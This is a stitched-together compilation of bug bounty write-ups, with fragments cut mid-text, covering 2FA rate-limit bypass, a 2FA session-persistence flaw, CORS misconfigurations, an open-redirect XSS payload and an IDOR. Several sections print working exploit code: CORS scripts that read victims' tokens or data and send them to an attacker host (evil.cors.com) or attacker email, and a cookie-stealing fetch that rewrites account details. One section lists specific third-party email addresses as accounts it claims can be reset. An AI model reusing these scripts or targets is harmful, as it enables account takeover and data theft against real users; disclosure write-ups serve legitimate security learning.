size Intruder Screen Burp Suite Step 03: Selecting the OTP placeholder and add it for simple brute force. Press enter or click to view image in full size Intruder screen with OTP placeholder selected for brute force Step 04: Select the Payload tab, changed the payload type to Numbers and change the payload options as desired and clicked on the attack. Press enter or click to view image in full size Payload Screen: For setting payload desired options Press enter or click to view image in full size Brute Force In Progress Step 05: As the brute force was in progress I could see length for one of the OTP value is changed from 617 to 2250.

Today, I would like to talk about a vulnerability I found on some programs that allowed me to bypass their 2FA protections. On a side note, due to the fact that the programs are private, all the informations about the websites will be redacted. That’s said, let’s start ! Introduction: As many hunters, when I start my research on a new bug bounty program, I use the application as a lambda user. This allow me to understand how the applications work and notice which features can be interesting to test. I noticed that the applications had a 2FA feature, I enabled it and I started to play with it. For those who are not familiar with the concept of 2FA (Two-factor authentication), this can be defined by: Two-factor authentication ( 2FA ) is a way to add additional security to your account. The first “factor” is your usual password that is standard for any account. The second “factor” is a verification code retrieved from an app on a mobile device or computer. (Wikipedia) Press enter or click to view image in full size Illustration by DoubleOctopus In a 2FA protection, the verification code is usually an integer between 4 and 6 digits. This mean that the number of combinations for each case is: 4 digits: 10⁴ → 10.000 combinations 6 digits: 10⁶ → 1.000.000 combinations In both cases, due to the low numbers of combinations, the 2FA code can be brute-forced (especially for 4 digits verification code). With those informations in mind, a 2FA should absolutely have a strong rate limit to not be easily bypassable. In the case of the applications I tested, they had a rate limit in place to avoid any kind of brute-force attack against the Two-factor authentication feature. The bypass: To be efficient, a rate limit need to be well implemented. I started to search if this limit could be bypassed. My first thought was to search on which value the rate limit was based. I tested the following parameters: User email address Session cookies Strangely, none of this parameter had an impact on the rate limit in place. After few minutes, I remembered a report by corb3nik . He was able to bypass a rate limit on Dashlane bug bounty program with the help of the X-Forwarded-For HTTP header . According to MDN Web Docs : Press enter or click to view image in full size I tested to bypass the rate limit a new time by adding a X-Forwarded-For header to the HTTP request and I was surprised by the fact that the applications accepted my request. With this issue an attacker could brute-force the Two-factor authentication by using the X-Forwarded-For header when his request will be blocked. Conclusion: A rate limit is a solid way to increase the security of your web-application. Nevertheless, they need to be well implemented to be efficient. In the case of a Two-factor authentication feature, the rate limit shouldn’t be based on an information that could be manipulated by the user via the HTTP request. I hope you enjoyed this reading !

Here’s the full content:\n\nHow I abused 2FA to maintain persistence after a password change (Google, Microsoft, Instagram, Cloudflare, etc) | by Luke Berner | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I abused 2FA to maintain persistence after a password change (Google, Microsoft, Instagram, Cloudflare, etc) Luke Berner 5 min read · Jan 25, 2019 -- 18 Listen Share TL;DR: Waiting in the 2FA page could allow you to log in without knowing the current password in many major websites. This is a logic flaw vulnerability I initially found in Google , and then tested in other top companies (such as Microsoft, Instagram, Cloudflare, etc ) to find out they were vulnerable as well. 1) The initial bug It all started with the idea that, being 2FA newer than most login flows, it would have to be implemented by different teams at different times (in some cases, probably years apart). As any project involving multiple teams, communication is hindered and coordination can be impacted. So… what happens if you try to change something in the process, like changing your password, while being in the process of logging in, let’s say in the 2FA login page? Press enter or click to view image in full size Image 1: 2FA input page, were the Attacker waits until the password is changed (yeah, that's not my real email) So I went, changed the password (triggering all sessions to be terminated ), waited 10–15 min and then tried the 2FA code… It worked! . Having this PoC, I immediately went and reported it to Google. After some exchange of emails, they acknowledge the issue but remarked that the sessions expired after 20 min: “If you find a way to make this attack work for more than, say, two hours please let us know. This would indicate a problem in our session logic.” 2) Round two After some weeks of slowly testing different scenarios ( to be honest, I thought it was a dead-end ) I found out a way of bypassing session expiration: if you went to ‘ Try another way ’ in the 2FA input page , chose 2FA as a method again (funny, right? ) your session was renewed, and you had another 20 minutes to go. Automated this test, made a PoC, waited for +2 hours and it still worked. Press enter or click to view image in full size Image 2: Way to bypass session expiration But this was not the best part . Poking around the options available and all the possible flows, I tried all this process again but, in the middle, turned off 2FA. Being in the 2FA input page, the code should not work if 2FA is off, right? Well, wrong. The 2FA code was working even when the 2FA option was off! . This changed everything. The attack scenario just got bigger. This means that if an Attacker hijacks an account (leaks happen everyday), exploiting this vulnerability the new attack scenario would be: An Attacker enables 2FA in Victim’s account. In another browser, Attacker waits indefinitely in the 2FA input page ( Image 1 ). Attacker disables 2FA . The Victim regains access to the account (changing password & resetting sessions) Then the Attacker could input a valid 2FA code and have access again to the account, without knowing the current password. I quickly sent this new information to Google and got the confirmation of the bug: Press enter or click to view image in full size After a few weeks, the panel awarded me a nice bounty and fixed the issue :) 3) The others Some days later I thought ‘ If this happened with Google , what about other companies? ’. I went on testing in other big companies ( Facebook , Github , LinkedIn ) and this was not working: whenever the password was changed or the 2FA was disabled, the session waiting in the 2FA input page would no longer be valid. However, being Instagram one of Facebook's top acquisition, I tried it there as well and found it was vulnerable ! Sadly, they labeled it as \"theoretical attack\". Microsoft Login was vulnerable too, but didn't fix it either (more on these later). After some trial and error, I went through HackerOne/Bugcrowd directories and found many companies that were vulnerable to this attack ( Cloudflare, Algolia, some private programs, etc ). They all fixed the vulnerability and awarded me bounty/swag. 4) Not fixing Two important companies labeled this vulnerability as \"working as intended\": Microsoft and Instagram . 4.1) Microsoft Being Microsoft one of the top companies as well, and having their ‘ Microsoft Identity Bounty Program ’ released within those days (up to 100K bounty), I checked their centralized login: login.live.com . Tested Google’s exact same attack scenario and I couldn’t believe my eyes: it worked, too! Sadly, it was not a good experience as it was with Google. All the responses I received seemed to fail understanding the vulnerability reported, and closed the report as “work as intended”. After some time, I escalated through LinkedIn with someone from Security for them to re-review the report. Made them a blog post about it explaining the vulnerability and 2 PoC videos. One of their answers was \" if you are still seeing this issue post 24 hours of logout, this could potentially meet the bar.\". S ent a PoC showing this was possible, but they still would not agree to fix it. Asked if it was OK for me to publicly disclose this information and they agreed. Communications with Microsoft started 06/2017. This vulnerability still works in Microsoft Login. 4.2) Instagram As soon as I validated that this vulnerability was working in Instagram , I crafted a nice report and sent it to them. However, the vulnerability was not fixed: \" [the attack] seems unlikely to happen commonly, making this more of a theoretical attack. The protection in this case is to not allow someone to steal your password \" I tried remarking that an \" unlikely \" in a +1B users platform could mean millions of users affected by this attack, but even then was not marked as valid. Some months later, after Facebook’s security breach in 09/2018 (and posting that they would be “ decreasing the technical overhead necessary to be eligible for bug bounty ”), I re-opened the issue asking if this could be reconsidered as a valid vulnerability. However, they told me I was not the first one reporting this vulnerability, so if this vulnerability was someday marked as valid, my report would still be ineligible for a reward.

Other 1 Instagram account is reactivated without entering 2FA ($500) by Aman Shahid · Published August 21, 2019 · Updated October 9, 2023 Description: When we have 2FA enabled on our Instagram account, let’s say I have an Instagram account with 2FA enabled. If I deactivate it for any reason, such as choosing to deactivate my Instagram account instead of deleting it to prevent others from viewing my Instagram profile or accessing its data an attacker can reactivate it using my credentials and without needing 2FA. I’ve noticed that if the 2FA-enabled Instagram account is deactivated and an attacker obtains access to its credentials, they can reactivate the account without needing the 2FA code. This is different from Facebook, where entering the 2FA code is required for reactivation. This discrepancy highlights a vulnerability, and it could potentially impact many users. 2FA is a crucial part of authentication, and an account should not be reactivated or any other action taken without requiring the 2FA code.

Microsoft Outlook is a personal information manager from Microsoft , available as a part of the Microsoft Office suite. Although often used mainly as an email application, it also includes a calendar , task manager , contact manager , note taking , journal , and web browsing. It can be used as a stand-alone application , or can work with Microsoft Exchange Server and Microsoft SharePoint Server for multiple users in an organization, such as shared mailboxes and calendars, Exchange public folders, SharePoint lists, and meeting schedules. Microsoft has also released mobile applications for most mobile platforms, including iOS and Android. Developers can also create their own custom software that works with Outlook and Office components using Microsoft Visual Studio . In addition, Windows Phone devices can synchronise almost all Outlook data to Outlook Mobile . This is more secured platform used by million of users on daily basis at corporate and personal use level. When I was searching for archived directories in web.archive.org, it suddenly strikes with some common parameter like below: /owa/username @hotmail.com/ and then my second step is to check that whether these username are expired one or active users, when put the first username, it gives me link that username is valid and redirected to password page. I tried many attempts to reset the password but no success. Then I tried one last option “I do not have any of these”. Afterwards you will redirected to next page where it will ask you to send the authentication code in any mail id. Now you have valid Microsoft username and your valid email id to receive the authentication code. At last I got the below authentication code: Microsoft account Password reset code: Please use this code to reset the password for the Microsoft account go*****@gmail.com . Here is your code: 0470572 If you don’t recognise the Microsoft account go*****@gmail.com , you can click here to remove your email address from that account. Thanks, The Microsoft account team I simply put the authentication code and redirected to security question where I need to answer very basic question, this is below screenshot and half of the information, you can get from username and other from social engineering. Press enter or click to view image in full size One can easily bypass these scenarios and I found more than 40,000 active users through waybackurls utility when I asked the Microsoft security team to reset the password for any active users, hence they did not allow me to do so and created their test accounts to allow me to reset their passwords. This is very basic security questionnaire, if you can compare with Google account recovery page, as they have put it over there and one can easily bypass it. When I asked to Microsoft security team that this is high critical bug and impacted large number of Microsoft users and simply ignored. This is below reply got from Microsoft. Microsoft Reply: Hello Vartul As stated earlier, these are not password reset codes, but just the codes to check if the email provided is valid. These cannot be used to reset password. Also, once the email has been confirmed, an attacker needs to provide verification information about the account for resetting password. That information is then verified. The attack mentioned in the report is not a security bypass. Please let me know if you have more questions. We have closed the case. Thanks MSRC Reproducing Steps: Go to below URLs and pick all emails and collect it one tex file. 2. Collect it all emails which contains all emails after /owa/ evangelinedobney@hotmail.com/ in this pattern. 3. All URL’s, I have collected from web.archive.org . 4. Let collect the six emails and try to exploit it. evangelinedobney@hotmail.com — → can reset the password for this account. evanieves269@msn.com — — → can reset the password for this account also. evaserio@hotmail.it — — — ->can reset the password for this account also. evuong@hotmail.com — — →can reset the password fo this account also. explicitsoundz@hotmail.com — →can reset the password fo this account also. fernandosoares121253@hotmail.com — ->last one access code I received and can reset the password for it. 5.

Open Redirect -> Reflected XSS [No data could be stolen] www.host.com/redencrypt?location=data:text/html%3Bbase64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg==&utm_source=saloncentric_app&utm_medium=referral This only worked on Safari so it was not so useful Vulnerable Parameter: location payload: data:text/html%3Bbase64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg == base64 decode: <script>alert(‘test3’)</script> 2nd Bug Session not invalidated after logout or changing Account Password To anyone who does not understand , This is when a session is captured and does not get expired or deleted after logout or even after changing the accounts password in my case. This can be found be simply by sending a request of an active session to burp suites Repeater Log Out or Change Account Password in Browser Replay the session in the repeater to see if it still shows User Data If it does, 🤑🤑🤑. Else: ☹️ JWT sessions work with time. So this is not likely when the host is using JWT tokens 3rd Bug CORS misconfiguration to steal victims sharing codes and eMail address On the platform, users can share discount codes, invites codes, etc. to the friends via a share function , which takes an input of their friends email (the receiver email). The receiver is also able to see the senders main account eMail in the mail he/she received. The issue here was/is, the only thing in scope till now is: host.com and this was found sub1.host.com That subdomain handled sending the codes Because of the CORS configuration on that domain, I was able to send[POST] data to it with the users cookies/credentials. This was fair enough for me because, i could make it send the codes to my eMail. This allowed me to steal the victims codes and the victims eMail after receiving the mail as i said earlier. Code on my evil web page: <script> function steal(){ var xmlH = new XMLHttpRequest(); xmlH.open(\"GET\", \"https://sub1.host.com/api/v4/mail-token\", true); xmlH.withCredentials = true; xmlH.send(); xmlH.onload = function(){ data = JSON.parse(this.responseText); var mail_token = data.mail_token; var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"https://sub1.host.com/api/v5/email/share-code\", true); xhr.setRequestHeader(\"MailToken\", mail_token); xhr.setRequestHeader(\"Content-Type\", \"application/json\"); xhr.send('{\"target\":\"id:222920\"},\"recipient_emails\":[\"mashoud1122@wearehackerone.com\"],\"message\":\"STOLEN WITHOUT NOTICE/Interaction + EMAIL OF VICTIM in TITLE\"}'); } } </script> <body onload=\"steal()\"></body> This script stole the temporal mail token , then makes a post request to the sharing endpoint with the mail token in the header for authorization, then sends codes and email to my eMail 4th Bug A simple Logical Bug This is not really a bug on its own. But these are things i always look for that upgrade my reports seveirty. sub2.host.com — vulnerable due to CORS misconfiguration Found sub2.host.com/api/v2/token this endpoint showed me a string. I tried those characters in many places randomly. Until I noticed it can also be used to authenticate an api host: mydata.host.com Putting that string into the Authorization header or in a cookie called “ ac_access_token ” on that host will give an authenticated api response of the users account. After fuzzing that host I noticed the api shows the following on different paths: Users purchases All the eMails the victim has shared anything at all with [MetaData] Victims account details [email, fullName, Number, etc] Rewards that the user currently has Creating the Final Bug Now, we already have a good bug. Since the other domain has a CORS misconfiguration [Meaning account takeover already]. But i just needed to make this bug cool. So i used each of the bugs to get an account take Over. The tokens from sub2.host.com/api/v2/token get changed on that page any time the user logs out or changes their password. So here is what i did. Open Redirect -> Attacking Site ->Attacking site abuses CORS Misconfig on sub1.host.com to receive victims email in my email with invite or discount code; I also replaced the message in the email. Message was the token stolen from sub2.host.com/api/v2/token -> Authenticate the api as the user with the stolen tokens received in our eMail::: And remember BUG 2??>> Sessions never got expired no matter what :) Api endpoints: /user-me— account details (email, Full Name,profile pic, lang, and some few other stuff) /user-me/purchases — Account Purchases[order Number, tracking, basic details that show on an order] /user-me/sharables — Every eMail the account has sent a code to.With the codes and the email batch that i can use to replicate the email ;) /user-me/rewards — Reward codes and other form of rewards given to users who actively purchase Press enter or click to view image in full size Abusing all the bugs to make their own site send me the codes ;) mydata.host.com — aleternate api to handle user data Now all i did was curl https://mydata.host.com/api/v4/user-me/purchases --cookie \" ac_access_token =STOLEN_TOKENS\" | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2 100 2 0 0 10 0 --:--:-- --:--:-- --:--:-- 10 [🤑🤑🤑🤑🤑🤑] curl https:// mydata.host.co m/api/v4 /user-me/ --cookie \" ac_access_token =STOLEN_TOKENS\" | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 311 100 311 0 0 2046 0 --:--:-- --:--:-- --:--:-- 2046 { \"id\": \"6747556293635101522\", \"email\": \"mashoud1122+test@not-wearehackerons-email\", \"first_name\": \"Mashoud\", \"last_name\": \"Acc2\", \"profile_picture_url\": null, \"lang\": \"en-US,en;q=0.5\" } Press enter or click to view image in full size Once you have this, it would work till ……. Nothing on the host expired after log out or password change. This was a private program. I had to modify a lot of stuff in this post.I also did not add the final script because, if i made a mistake in the editing the enpoints or domains, you might get confused. And i also feel like this host could be found if i had used the real endpoints :( . Sorry. But i hope everything added up to give you some extra techniques Security wise, i think the programs structure was just misconfigured. The team took the severity into consideration and accepted the bug.

Here’s the full content:\n\nAdding anyone including non-friend and blocked people as co-host in personal event! | Bugreader Bugreader Reports Home Reports Social Researchers Login Register Binit Ghimire Published On: 02 May 2020 $ 750 Adding anyone including non-friend and blocked people as co-host in personal event! IDOR Facebook | Web Inclusion in the 2019 Thanks page MEDIUM VALID This IDOR vulnerability in the Facebook Events platform allowed an attacker profile to add anyone as co-host in his/her personal event including non-friends, non-friends-of-friends and people who have blocked him/her. Description When you are creating an event from your personal profile on Facebook, Facebook would ask you to select friends who you want to add as co-hosts for the event. For this vulnerability to be reproduced, you would have to select a friend as co-host and while submitting the request to Facebook, you would have to replace his/her profile ID with the profile ID of someone who is neither your friend, nor any of your friends-of-friends (i.e. either non-friends-of-friends or blocked people). Impact Taking an advantage of this vulnerability, an attacker would be able to add anyone including non-friends-of-friends and blocked people (people he/she has blocked and people who have blocked him/her) as co-host in his/her personal event on Facebook. Reproduction Steps Step 1 Login to User A's account on the web version of Facebook, and then visit https://www.facebook.com/events/ Step 2 Click on \" Create Event \" and select any of the options among private and public events. Step 3 Select User A in Event Host drop-down list (if User A has pages, it will show drop-down list, otherwise it will show User A only, so in such case, no need to worry about selecting User A as it is selected by default). Step 4 Fill up all the fields in any way you want, and in Co-hosts field, enter \" User B \" and select User B . Step 5 Before clicking on the \" Create \" button, start intercepting on BurpSuite or OWASP ZAP or any other similar tools. Step 6 Click on the \" Create \" button, and keep forwarding all the requests until you see a request which looks like this: POST /ajax/create/event/submit/?title=[EventName]&description=[Description]&location=...&location_id=....&location_latlong[latitude]=...&location_latlong[longitude]=...&cover_focus[x]=0.5&cover_focus[y]=0.5&only_admins_can_post=true&post_approval_required=false&co_hosts[0]=1008&start_date=11%2F25%2F2019&start_time=7200&end_date=11%2F25%2F2019&end_time=18000&timezone=........ HTTP/1.1 Here, 1008 = User ID of User B Step 7 Replace the value of co_hosts[0] parameter with the User ID of non-friend, i.e. User C (31337) , and then forward the request. Now, the event will be created. Step 8 When you click on \" 1 co-host pending \", you will be able to see that User C has been successfully added as co-host in the event. Step 9 Now, login to User C's account, and you will be able to see a notification telling \" User A made you a host of his/her event [EventName]. \" Exceptional Case If User C has blocked User A, then also this works without any issue, but in that case, User C won't be able to see the event because of User A being blocked, however User A will see User C in pending co-host list. SETUP Requirements: 1. A PC with a web browser 2. An Internet connection, and no geographical restriction on the usage of Facebook 3. Three Facebook accounts; User A, User B and User C. User A = event host = User ID is 1337 User B = User A's friend, who has no role, but will be useful when selecting a co-host for the event so that it can intercepted = User ID is 1008 User C = totally unknown person to both User A and User B, and not friend with any of them = User ID is 31337 Timeline Binit 25 Nov 2019 Submitted the vulnerability report On this date, I submitted the vulnerability report to Facebook.

Jayateertha Guruprasad 3 min read · Apr 21, 2020 -- 1 Listen Share This is a story of CORS bug that I found in one of Google’s aquisition -Kaggle,Where I got rewarded for CORS bug in 404 page. One fine day I was looking at one of the aquisitions of Google-(Kaggle),Kaggle is used worldwide by Machine Learning community and is pretty famous. I tried looking for CSRF bugs all over website but everything went in vain.I also searched for CORS misconfigurations but couldn’t find anything useful. I visited a 404 page accidentally and looked at it’s source code — It had a script tag whose body contained AntiForgery token which is the same token sent as X-XSRF-TOKEN in all the requests ,This is the CSRF token which is sent as headers in all the sensitive endpoints. antiForgeryToken leaked via CORS misconfig in 404 page I changed the origin header of 404 page to mydomain.tld then replayed the request and got the response — The header Access-Control-Allow-Origin and Access-Control-Allow-Credentials was set to mydomain.tld and True respectively.This means any other 3rd party domain is able to get and view response from Kaggle.com.This only happens in the 404 page and is a CORS misconfig in 404 page only!!! I quickly generated a POC ,which contained 2 parts : Get User specific Kaggle CSRF TOKEN from the 404 page. Using the CSRF Token from recieved from above to generate a API key on behalf of user. Press enter or click to view image in full size Generate API KEY on begalf of user using CORS and CSRF bugs combined. I then reported the GoogleVRP team about this incident with this POC and got rewareded with $$$ ,This time it was lower amount.A bug on Google’s aquisition is rewarded relatively lower compared to a bug on Google. The GoogleVRP platform is always very friendly and is a great one for security researchers like me.I recommend everyone to try researching in this great Platform. I would also like to mention and Thank about the GoogleVRP team’s great decision which benefits most of the Google security researchers community at this crucial COVID-19 time — https://security.googleblog.com/2020/04/research-grants-to-support-google-vrp_20.html Liked my article ?

If you want to read my previous ones, have a look here at my personal blog. So you might have reached here thinking it’s a big & complex hack but believe me it’s nothing. It’s a very simple misconfiguration of Cross-Origin Resource Sharing (CORS) on one of Twitter’s product called niche . For Understanding and exploiting CORS, read this awesome blog by @albinowax To give a little background of niche, it’s a platform for creators to increase their social media presence by sharing there work(Pics, videos and other stuff). So whats the important asset here : Creators Work - Their Images & Videos. Another great feature of niche is that you can sync your posts from different social media platforms like Facebook, Twitter, Instagram etc. Isn’t that heaven for creators, all of their private work at single place. If you noticed the word “private” in the above line, than you do think like a hacker. Yes, niche also syncs private posts from all these social platforms(It does ask while connecting your other social platforms during OAuth). After seeing that, i knew it would be great if we can somehow see other users private posts from social media through niche. So i tried for doing horizontal privesc but no luck. After going through request in burp history, i saw in response “ Access-Control-Allow-Origin: https://niche.co & Access-Control-Allow-Credentials: true\". So tried exploiting by sending custom Origin header in request and found that the server was only checking whether “//niche.co” was in Origin header. So if Origin : https://evil.co , Access-Control-Allow-Origin : https://niche.co But if Origin: https://niche.co.evil.net , Access-Control-Allow-Origin : https://niche.co.evil.net . That’s it! Press enter or click to view image in full size CORS Misconfig Quickly went to the page where all synced photos from other social media were fetched and that was vulnerable as well, basically whole site was vulnerable. It even had an api endpoint which i found using fuzzing and which wasn’t used in whole site(maybe for dev or legacy) and didn’t even had a documentation but it did displayed all the methods that can be used during hit n trial. Combining vulnerable api and site, i can steal any information about the other users using CORS(Images, email id, bio, profile info, CSRF tokens etc). So made a simple POC that looked like this: <html> <body> <button type='button' onclick='cors()'>CORS</button> <p id='demo'></p> <script> function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { var a = this.responseText; // Sensitive data from niche.co about user account document.getElementById(\"demo\").innerHTML = a; xhttp.open(\"POST\", \"http://evil.cors.com\", true);// Sending that data to Attacker's website xhttp.withCredentials = true; console.log(a); xhttp.send(\"data=\"+a); } }; xhttp.open(\"GET\", \"https://www.niche.co/api/v1/users/*******\", true); xhttp.withCredentials = true; xhttp.send(); } </script> </body> </html> Hosted on domain niche.co.evil.net (locally) and when someone visits it and if they are logged in to niche, all of their sensitive info from niche.co will be forwarded to my domain. That’s it, a simple CORS misconfig with big impact yet Twitter didn’t rewarded since niche domain wasn’t eligible for bounty(can’t argue). But hey, Twitter HOF for few hours of work…..i’ll take it! When the hackerone report was disclosed, many questioned why i did it for free? but at the end i know i learned a lot about CORS, same origin policy, how exactly it works on different browsers. It was a great learning experience and that’s what matters to me. YOUR MONEY CAN BE INFLATED AWAY BUT YOUR KNOWLEDGE CANNOT.

The target let’s just say it was named redact.com was sending a PUT request to the server for updating User Information like Address, Name, etc. An Origin Header was also sent in the request Origin: redact.com which was reflected in the Response and the Access-Control-Allow-Credentials was set to True. Which means that cookies can be sent along with the request. I tried to change the Origin Header value to evil.com and then redact.com.evil.com but both were rejected. But sending the Origin : evil . redact.com worked which means that sub domain of redact.com can send requests to its API. Press enter or click to view image in full size Now I needed an XSS on one of its subdomains to send the PUT request to the Server, luckily I got an XSS on help.redact.com. But it wasn’t enough an enctyptedMembershipNumer param was sent along with the PUT request to identify the user. After looking into the Cookies of redact.com I found that the enctyptedMembershipNumer was saved in a cookie with a name prop_29 which was scoped to the . redact.com the dot, in the beginning , means that this cookie can be accessed from its subdomains. So to extract that Cookie I wrote a JS code. function getCookie(name) { var match = document.cookie.match(new RegExp(‘(^| )’ + name + ‘=([^;]+)’)); if (match) return match[2]; } Now the complete code to get the enctyptedMembershipNumer and to send the PUT request. function getCookie(name) { var match = document.cookie.match(new RegExp(‘(^| )’ + name + ‘=([^;]+)’)); if (match) return match[2]; } cook = getCookie(“prop_29”) data = {“member”:{“mailingAddress”:{“addressLineOne”:”Account Hacked”,”city”:”NEW Port”,”stateOrProvinceCode”:”NY”,”postalCode”:”20001\",”email”:” hacked@gmail.com ”,”countryCode”:”US”}}} fetch(` https://www.redact.com/api/node/vivaldi/v1/account/primary-contact?encryptedMembershipNumber=${cook}` , {method: “PUT”, credentails: “include”, body: JSON.stringify(data)}) I created a JS file and uploaded the code on my server to use in the XSS payload.

I had arrived to my house on Friday and received an invitation from HackerOne to join in private program, immediately started doing recognition on the platforms of the program, well, I found an interesting website where had a good bugs (IDOR, CSRF), however, I wanted looking for the biggest bug in the website, so, I tried to exploit a different logical flaws, some SSRF with XSPA, but I didn’t succeed :(. Once the whole website was mapped, I tried to see if I could exploit a CORS type bug (if you want to learn about CORS, you could read this article https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS ). When I made a request with a different Origin, I got the following: Request curl -v -X GET http://privatewebsite.com -H ‘Origin: http://evilwebsite.com’ Response HTTP/1.1 200 OK Cache-Control: no-store, no-cache, no-transform, must-revalidate, max-age=0 Access-Control-Allow-Credentials: true Access-Control-Allow-Origin: http://evilwebsite.com Vary: Origin Content-Type: application/javascript; charset=UTF-8 Date: Wed, 24 Jan 2018 21:56:33 GMT Connection: close As you can see, the website was vulnerable to CORS, since it allowed a connection from another source and also returned the header Access-Control-Allow-Credentials : true which allows exploitation to be successful. Then, I started to create the exploit, but I realized that every time I tried to extract anything from the site, it was not possible, since connections were being made by sockets that only worked once. For example, I made a request Press enter or click to view image in full size Press enter or click to view image in full size First Response When I tried to perform this request again with the same URI, the following happened: Press enter or click to view image in full size As you can see, it is not possible to reuse the same URL, or if it is true, if it was possible, but you had to wait about 10 minutes for that socket connection to die to be able to use it again, and therefore that does not make sense (if we put ourselves on the attacker’s side). Then, it occurred to me that modifying the URI by any other value, it was possible to use the socket again as a new one. For example, Socket Used http://privatewebsite.com/sockjs/669/lsbw5zgh/xhr I changed the URI http://privatewebsite.com/sockjs/123/lsbwabcd/xhr New sockect accepted :). Until then, he had already managed to exploit the CORS, since I could generate any URI and send it through CORS to the victim, and this person when opening the link, could have captured the information of his session. I continued studying the behavior of the website, and I noticed something very interesting, when I entered any resource on the website, 5 requests were loaded by Sockets, which were related to each other. Press enter or click to view image in full size Interesting Request In the fifth request you can see a lot of confidential information about the user, among them, the user, the session token (if this was captured an attacker could obtain the session of a user.) Therefore, an exploit should be created in CORS which I would have to do each of these 5 requests until I get to the last one and that way I could get that information from the user.You’ll be wondering, why did not you just do a CORS exploit with just that request? It happens that each of these requests is linked to each other and if only the last one was executed, the necessary verification of the other 4 request would not be carried out. First request Press enter or click to view image in full size Press enter or click to view image in full size Second request Press enter or click to view image in full size Press enter or click to view image in full size Third Request Press enter or click to view image in full size Press enter or click to view image in full size Fourth Request Press enter or click to view image in full size The information by POST, could be captured by the attacker through various types of MITM attacks, Phishing, etc. (This is because the website does not have an SSL certificate). Fifth Request Press enter or click to view image in full size Press enter or click to view image in full size If it has not been very clear, I will explain it again, when you enter any resource on the website, these 5 requests are loaded through the socket, which complement each other, therefore what I did next was create an exploit in CORS which replicates each of these requests, this is sent to the victim and later it is possible to obtain their information. exploitCORS.html <!DOCTYPE html> <html> <head><title>Exploiting CORS</title></head> <body> <center> <h1>Getting your information through CORS</h1> <button type=\"button\" onclick=\"ProcessUrls()\">Exploit</button> </div> <script type=\"text/javascript\"> var cont = 0; var requests = new Array(); function ProcessUrls() { requests = new Array(); var urls = new Array('http://privatewebsite.com/sockjs/203/jb93ne78/xhr','http://privatewebsite.com/sockjs/203/jb93ne78/xhr_send','http://privatewebsite.com/sockjs/203/jb93ne78/xhr', 'http://privatewebsite.com/sockjs/203/jb93ne78/xhr_send','http://privatewebsite.com/sockjs/203/jb93ne78/xhr'); for(i=0;i<urls.length;i++) { requests.push(new ProcessUrl(urls[i])); } } function ProcessUrl(url) { cont+=1; if (cont == 2 ){ var http = new XMLHttpRequest(); http.open(\"POST\", url, true); http.withCredentials = true; http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 204) { http.responseText } }; http.setRequestHeader(\"Content-Type\", \"text/plain;charset=UTF-8\"); http.send('[\"{\\\\\"msg\\\\\":\\\\\"connect\\\\\",\\\\\"version\\\\\":\\\\\"1\\\\\",\\\\\"support\\\\\":[\\\\\"1\\\\\",\\\\\"pre2\\\\\",\\\\\"pre1\\\\\"]}\"]'); } else if (cont == 4 ){ var http = new XMLHttpRequest(); http.open(\"POST\", url, true); http.withCredentials = true; http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 204) { http.responseText } }; http.setRequestHeader(\"Content-Type\", \"text/plain;charset=UTF-8\"); http.send('[\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"login\\\\\",\\\\\"params\\\\\":[{\\\\\"resume\\\\\":\\\\\"abcabcabcabcabcabcabcabcabcabcabcabcabcabca\\\\\"}],\\\\\"id\\\\\":\\\\\"1\\\\\"}\",\"{\\\\\"msg\\\\\":\\\\\"sub\\\\\",\\\\\"id\\\\\":\\\\\"hihihihihihihihi\\\\\",\\\\\"name\\\\\":\\\\\"meteor.loginServiceConfiguration\\\\\",\\\\\"params\\\\\":[]}\",\"{\\\\\"msg\\\\\":\\\\\"sub\\\\\",\\\\\"id\\\\\":\\\\\"yzyzyzyzyzyzyzyzy\\\\\",\\\\\"name\\\\\":\\\\\"meteor_autoupdate_clientVersions\\\\\",\\\\\"params\\\\\":[]}\",\"{\\\\\"msg\\\\\":\\\\\"sub\\\\\",\\\\\"id\\\\\":\\\\\"efefefefefefefefe\\\\\",\\\\\"name\\\\\":\\\\\"hooks\\\\\",\\\\\"params\\\\\":[]}\"]'); } else if (cont == 5) { var http = new XMLHttpRequest(); http.open(\"POST\", url, true); http.withCredentials = true; http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 200 || http.readyState == 4 && http.status == 204 ) { alert(http.responseText) } }; http.send(); } else { var http = new XMLHttpRequest(); http.open(\"POST\", url, true); http.withCredentials = true; http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 200 || http.readyState == 4 && http.status == 204 ) { http.responseText } }; http.send(); } } </script> The exploit will perform the 5 socket request, therefore when executing this you get the following Press enter or click to view image in full size Press enter or click to view image in full size It’s working. Through this, you could use the session token to take control of another user’s account :D. The vulnerability was accepted by the program and I was rewarded :).

Until and unless an issue or loophole present in the application is not exploited and made impactful in a real-life scenario, the term “vulnerability” doesn’t suit as the perfect noun for it. The same scenario transpired with me I am not that usual/dedicated bughunter. Actually, I am more into pentesting because I am working for one of the top cybersecurity company in Nepal. I love to intercept network traffic of mobile apps :D. I picked up a random program from bugcrowd, downloaded the scope application fired up my best tool Frida 😀 and started intercepting the network traffic. I checked for CRLF, Host Header Injection, HTTP Response Splitting and other vulnerabilities relating with headers Because Headers are the cool things, I call them messengers 😀 without them communication is not possible, although I didn’t find anything there. Finally, I attempted to add the “Origin” header with my domain and it accepted the origin and reflected my domain in response. I double checked and found that “Access-Control-Allow-Credentials” header was present as well. 😀 Testing CORS miss-configuration So Vulnerability = Confirmed ! but Exploitation = ??? Yes, the exploitation was a really big challenge for me because it’s a mobile app API and I looked the entire scope of a program and found that the API is not used anywhere in the web platform. 🙁 I tried opening the in-app browser as well, it was little tricky to open links on the in-app browser because there wasn’t an option to feed the URL and it successfully didn’t work. 🙁 So finally I decided to make a working POC although we cannot exploit it properly. It can be called as an ideal situation or with high AC (attack complexity). I started firefox browser and copied the cookies from burpsuite and injected those cookies 